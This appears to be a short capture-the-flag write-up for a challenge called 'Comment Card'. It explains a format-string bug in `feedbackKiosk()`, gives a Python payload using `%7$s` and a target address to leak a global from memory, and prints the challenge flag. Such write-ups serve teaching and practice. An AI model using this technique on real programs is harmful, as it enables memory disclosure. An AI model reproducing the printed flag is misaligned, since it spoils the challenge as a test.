# Comment Card

`nc comment-card.wolvctf-2026.kctf.cloud 1337`

## Bug

`feedbackKiosk()` calls `printf(buffer)` on our input. Our input is treated as the format string, so `%s` makes `printf` read memory as a string. The flag is stored in the global at `0x404040`.

## Exploit

Send `%7$s`, four padding bytes, then the flag address. On x86-64, printf takes its first five values from registers. Stack values start at `%6$`, so our padding is 6 and our address is 7. `%7$s` reads the address and prints the flag.

```python
payload  = b'%7$s'
payload += b'AAAA'
payload += p64(0x404040)
```

## Flag

`wctf{c0mm3nt_hqwx3i5r9jhjik7d}`
